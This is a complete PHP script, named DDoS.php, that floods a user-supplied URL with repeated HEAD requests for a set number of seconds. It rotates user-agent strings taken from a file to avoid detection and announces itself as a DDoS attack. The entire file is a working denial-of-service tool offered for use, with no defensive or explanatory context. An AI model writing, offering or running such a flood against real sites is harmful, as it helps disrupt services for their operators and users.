<?php
set_time_limit(0);
error_reporting(0);

if ($argc < 4) {
    echo "Usage: php DDoS.php <url> <time> <ua file>\n";
    exit(1);
}

$url = $argv[1];
$time = (int) $argv[2];
$ua_file = $argv[3];

if (!filter_var($url, FILTER_VALIDATE_URL)) {
    echo "Invalid URL\n";
    exit(1);
}

if (!file_exists($ua_file)) {
    echo "Useragent file not found\n";
    exit(1);
}

$ua_list = file($ua_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$total_ua = count($ua_list);

echo "Starting DDoS attack on $url for $time seconds...\n";

$start_time = time();

while (true) {
    if ((time() - $start_time) > $time) {
        break;
    }

    $ch = curl_init($url);
    $random_ua = $ua_list[rand(0, $total_ua - 1)];
    curl_setopt($ch, CURLOPT_USERAGENT, $random_ua);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_exec($ch);
    curl_close($ch);
}

echo "DDoS attack completed.\n";

?>